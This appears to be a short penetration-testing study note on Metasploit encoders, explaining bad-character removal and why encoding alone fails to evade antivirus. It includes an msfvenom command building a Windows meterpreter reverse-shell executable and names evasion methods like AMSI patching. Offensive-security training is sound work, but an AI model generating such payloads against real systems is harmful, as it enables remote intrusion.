# MSF — Encoders

Encoders serve two purposes: strip bad characters from payloads (`-b "\x00"`), and architecture compatibility. AV evasion via encoding alone is dead — SGN at 1x iteration hits 54/69 on VT, 10x iterations hits 52/65. Don't rely on it.

List compatible encoders for your current exploit + payload combo:

```
msf6 exploit(...)> show encoders
```

Generate encoded payload with msfvenom — `-e` picks encoder, `-i` sets iteration count, `-b` strips bad chars:

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -o <OUTFILE>.exe
```

Check detection rate against VirusTotal with API key:

```bash
msf-virustotal -k <API_KEY> -f <OUTFILE>.exe
```

> [!warning] Submitting payloads to VirusTotal shares them publicly and burns the sample — AV vendors pull from VT. Use it for learning, not for live engagements.

Encoding only is not AV evasion. For real bypass: custom shellcode loaders, process injection, AMSI patching, or commercial C2 frameworks. That's out of scope here — don't waste exam time on encoder tuning.